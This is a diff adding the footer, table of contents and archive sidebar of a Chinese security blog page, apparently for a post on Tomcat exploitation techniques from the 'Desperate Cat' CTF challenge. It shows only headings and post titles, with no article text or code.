+            <p>更新日期：<a href="https://hackerqwq.github.io/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/">February 23rd 2023, 11:25:27 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/" title= "利用链神器-tabby使用">
+                    <div class="prevTitle">利用链神器-tabby使用</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:a785745707@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/HacKerQWQ" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/Misaka.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">目录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Desperate-Cat%E8%83%8C%E6%99%AF"><span class="toc-number">3.</span> <span class="toc-text">Desperate Cat背景</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#voidfyoo%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text">voidfyoo预期解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp-unicode%E5%B0%9D%E8%AF%95"><span class="toc-number">3.1.1.</span> <span class="toc-text">jsp unicode尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%B3%E6%9A%97%E8%8A%B1%E6%98%8E"><span class="toc-number">3.1.2.</span> <span class="toc-text">柳暗花明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-Session%E4%BF%9D%E5%AD%98%E6%9C%BA%E5%88%B6"><span class="toc-number">3.1.3.</span> <span class="toc-text">Tomcat Session保存机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Catalina%E9%80%80%E5%87%BA%E5%86%99%E5%85%A5Session%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.4.</span> <span class="toc-text">Catalina退出写入Session文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reload%E5%86%99%E5%85%A5Session%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.5.</span> <span class="toc-text">reload写入Session文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reload%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">3.1.5.1.</span> <span class="toc-text">reload原理分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%BE%E6%88%90reload%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.5.2.</span> <span class="toc-text">达成reload条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9appBase"><span class="toc-number">3.1.5.3.</span> <span class="toc-text">修改appBase</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">3.1.5.4.</span> <span class="toc-text">完整exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WreckTheLine%E5%92%8CSauercloud%E6%88%98%E9%98%9F%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">3.2.</span> <span class="toc-text">WreckTheLine和Sauercloud战队非预期解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WatchedResources"><span class="toc-number">3.2.1.</span> <span class="toc-text">WatchedResources</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jar%E5%8C%85%E5%86%85%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84"><span class="toc-number">3.2.2.</span> <span class="toc-text">jar包内资源文件映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%90%88%E6%B3%95jar%E5%8C%85"><span class="toc-number">3.2.3.</span> <span class="toc-text">构造合法jar包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B"><span class="toc-number">3.2.4.</span> <span class="toc-text">jsp编译过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp-1"><span class="toc-number">3.2.5.</span> <span class="toc-text">完整exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E5%BA%94%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">攻防应用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 163
+        </div>
+        <!-- search  -->
+        
+            <div class="site-search popup-trigger">
+                <span class="iconfont-archer search-icon">&#xe627;</span>
+            </div>
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2023 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/" >Despercate Cat 带来的Tomcat利用思路</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2022 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href= "/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/" >利用链神器-tabby使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2022/10/01/neo4j%E5%9B%BE%E5%BD%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0/" >neo4j图形数据库笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2022/09/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >PHP反序列化利用面总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2022/09/22/Webshell%E5%85%8D%E6%9D%80%E4%B9%8Bphp/" >Webshell免杀之php(WebShell免杀篇一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href= "/2022/09/21/source-map%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8/" >source map源码泄露利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2022/09/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%88%A9%E7%94%A8%E9%9D%A2/" >中间件利用面</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2022/08/31/java%E5%9F%BA%E7%A1%80%E4%B9%8Bjndi/" >java基础之jndi</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2022/08/24/java%E5%9F%BA%E7%A1%80%E4%B9%8BRMI/" >java基础之RMI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2022/08/23/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" >Shiro漏洞分析及利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/2022/08/20/Jboss%E5%88%A9%E7%94%A8%E9%9D%A2%E6%95%B4%E7%90%86/" >Jboss利用面整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2022/08/18/%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" >富文本编辑器漏洞整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/27</span><a class="archive-post-title" href= "/2022/07/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" >内网渗透之横向移动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2022/07/18/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" >javaweb代码审计学习(OGNL表达式注入)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2022/06/18/p%E7%A5%9E-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Anginx%E6%9C%BA%E5%88%B6%E7%9A%84LFI%E5%88%A9%E7%94%A8/" >(p神)环境变量命令执行及nginx机制的LFI利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/05</span><a class="archive-post-title" href= "/2022/05/05/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/" >Web安全之机器学习算法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
